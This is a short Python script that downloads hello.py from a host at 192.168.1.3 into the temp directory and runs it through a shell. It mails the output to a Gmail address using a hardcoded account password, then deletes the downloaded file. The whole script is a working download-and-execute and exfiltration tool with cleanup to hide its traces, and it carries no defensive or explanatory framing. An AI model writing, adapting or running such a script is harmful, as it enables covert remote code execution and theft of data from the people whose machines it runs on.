#!/usr/bin/python3
import requests
import smtplib
import subprocess
import os
import tempfile
import time

def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download('http://192.168.1.3/hello.py')
command = 'C:\\Python3\\python hello.py'
result = subprocess.check_output(command, shell=True)
time.sleep(6)
send_mail('xyz@gmail.com', 'hdoizxbpliyomjga', result)
os.remove('hello.py')
